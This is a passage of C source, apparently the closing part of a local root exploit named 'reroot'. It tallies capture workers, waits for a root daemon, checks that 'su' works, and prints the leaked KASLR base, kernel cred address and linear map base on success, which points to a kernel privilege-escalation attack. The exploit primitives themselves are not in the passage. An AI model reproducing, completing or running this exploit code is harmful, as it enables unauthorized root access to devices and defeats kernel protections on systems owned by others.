                                 capture_states[i].ok &&
                                 capture_states[i].restore_ok
                             ? 1U
                             : 0U;
    capture_su_ready += capture_states[i].su_ready ? 1U : 0U;
  }
  printf("[reroot] TRIGGER_DONE workers=%u results=%u successes=%u "
         "su_ready=%u probe_rc=%d\n",
         CAPTURE_WORKERS, capture_results, capture_successes,
         capture_su_ready, probe_rc);
  if (probe_rc != 0 || capture_successes == 0) {
    fprintf(stderr, "[reroot] write-only root capture failed\n");
    goto cleanup;
  }

  for (size_t i = 0; i < CAPTURE_WORKERS; ++i) {
    stop_child(&captures[i]);
  }

  if (!target_state.root_ready) {
    if (wait_for_child_condition(&target, ROOT_READY_TIMEOUT_MS, target_line,
                                 &target_state,
                                 &target_state.root_ready) != 0) {
      fprintf(stderr, "[reroot] target did not launch root daemon\n");
      goto cleanup;
    }
  }
  if (!existing_root_works()) {
    fprintf(stderr, "[reroot] independent su verification failed\n");
    goto cleanup;
  }

  printf("[reroot] SUCCESS boot_id=%s kaslr_base=0x%016" PRIx64
         " cred=0x%016" PRIx64 " linear_map_base=0x%016" PRIx64 "\n",
         boot_id, target_state.kaslr_base, target_state.cred,
         linear_map_base);
  result = 0;

cleanup:
  stop_child(&probe);
  for (size_t i = 0; i < CAPTURE_WORKERS; ++i) {
    stop_child(&captures[i]);
  }
  stop_child(&holder);
  stop_child(&target);
  if (result != 0) {
    fprintf(stderr, "[reroot] FAIL boot_id=%s\n", boot_id);
  }
  return result;
}
